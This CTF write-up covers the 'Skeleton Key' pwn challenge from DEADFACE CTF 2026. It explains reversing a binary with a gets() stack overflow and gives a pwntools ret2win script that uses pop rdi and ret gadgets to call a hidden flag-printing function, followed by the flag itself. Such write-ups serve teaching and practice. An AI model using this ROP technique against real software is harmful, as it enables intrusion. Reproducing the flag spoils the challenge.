---
title: Skeleton Key
tags:
  - DEADFACE CTF 2026
  - Exploitation
  - Reverse Engineering
---

# Skeleton Key

| | |
|---|---|
| **CTF** | DEADFACE CTF 2026 |
| **Category** | PWN / Binary Exploitation |
| **Points** | 125 |
| **Author** | @SpiffyLich |
| **Writeup by** | [TheMusk3teers](../../../members.md)<br>[H0ussamCl4p](https://github.com/H0ussamCl4p) · [chaimae098](https://github.com/chaimae098) · [fatimaezzahralag-ship-it](https://github.com/fatimaezzahralag-ship-it) · [imanebouzbiba](https://github.com/imanebouzbiba) |

## Challenge

> Charles here again — Nice work on the previous job! Looks like we were right, that last binary was definitely the work of D34TH. Digging around in the decrypted results gave us some IP info that led us to some fairly open servers running on a pretty infamous bulletproof host... After a bit of recon, we think we found stage 2 of the whole ordeal.
>
> Submit the flag as `deadface{flag-text}`.

Files given: `Skeleton_Key.zip` (513 MB padded ELF, SHA256: `9d3b0e9b9d13f48977b922c860f6ae73479277fc723b30007c63d7c4637c03ff`)
Target: `159.65.228.107:5002`

## Solution

### 1. Reversing the binary

Like the rest of @SpiffyLich's pwn series, the real x86-64 ELF sits at the start of a 513 MB padded file and is compiled with **no PIE** and **no stack canary**.

- `main` calls `gets()` into a stack buffer at `rbp - 0x40`, giving a **`0x48` (72-byte)** offset to the saved return address.
- An unreferenced function **`Wretched_Lock(uint64_t key)`** at `0x401507` opens and prints `flag.txt`, provided its first argument (`rdi`) equals **`0xdeadc0de`**.
- A clean `pop rdi; ret` gadget is located at `0x401615`, and a standalone `ret` gadget for 16-byte stack alignment sits at `0x40161a`.

### 2. Exploit (`ret2win` with argument)

```python
from pwn import *

io = remote("159.65.228.107", 5002)

RET          = 0x40161a
POP_RDI_RET  = 0x401615
WRETCHED_LOCK = 0x401507

payload = (
    b"A" * 0x48
    + p64(RET)
    + p64(POP_RDI_RET)
    + p64(0xdeadc0de)
    + p64(WRETCHED_LOCK)
)

io.sendline(payload)
print(io.recvall().decode(errors="replace"))
```

## Flag

!!! flag "Flag"
    `deadface{R355UR3CT_D34D_C0D3}`

## Takeaways

On x86-64 System V ABI, the first integer argument to a function is passed in `rdi`. Chaining `ret` (for stack alignment) → `pop rdi; ret` → `0xdeadc0de` → `Wretched_Lock` cleanly satisfies the argument check and prints the flag.
